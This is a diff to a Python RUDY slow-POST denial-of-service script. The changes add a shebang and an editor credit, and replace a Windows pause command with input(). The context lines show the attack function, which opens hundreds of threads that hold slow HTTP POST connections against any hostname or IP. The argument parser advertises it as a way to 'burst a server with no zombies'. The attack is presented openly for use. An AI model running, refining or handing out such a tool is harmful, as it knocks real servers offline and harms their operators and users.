@@ -1,4 +1,8 @@
+#!/usr/bin/env python3
+
 # Copyright Nicolas Pielawski 2016
+#   Edited by aiglebleu for hightechlowlife.eu
+
 import argparse, threading, socket, time, os
 
 website_post_running = True
@@ -23,7 +27,7 @@ def website_post(host, port = 80, length = 1024, time_wait = 1, thread_mode = Fa
             website_post(host, port, length, time_wait)
         time.sleep(time_wait)
 
-    sock.close()
+    sock.close() 
     website_post(host, port, length, time_wait)
 
 def rudy_attack(host, port = 80, length = 1024, time_wait = 1, thread_nbr = 512):
@@ -33,11 +37,11 @@ def rudy_attack(host, port = 80, length = 1024, time_wait = 1, thread_nbr = 512)
     for i in range(thread_nbr):
         thread_pool.append(threading.Thread(None, website_post, None, (host, port, length, time_wait, True)))
         thread_pool[i].start()
-        print("{} threads started to attack {}:{}!\r".format(i+1, host, port), end="")
+        print("{} threads started to attack {}:{}!\r".format(i+1, host, port))
     print()
     print('Processing RUDY attack, now!')
-    print('Press any key to stop the attack...')
-    os.system('pause>nul')
+    print('Press enter key to stop the attack...')
+    input()
     print("Closing...")
     website_post_running = False
     for thr in thread_pool:
@@ -46,7 +50,7 @@ def rudy_attack(host, port = 80, length = 1024, time_wait = 1, thread_nbr = 512)
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Processes the RUDY attack on an arbitrary target.',
                                      epilog='And that\'s how you burst a server with no zombies ;)')
-    parser.add_argument('server', help='Hostname of the target to focus')
+    parser.add_argument('server', help='Hostname or ip of the target to focus')
     parser.add_argument('-p', '--port', metavar='port', type=int, default=80, help='Port of the target to focus')
     parser.add_argument('-l', '--length', metavar='packet_len', type=int, default=1024, help='Length of the TCP Packet (without HTTP header)')
     parser.add_argument('-t', '--time', metavar='packet_time', default=1, help='Amount of time to wait between two TCP packets send.')
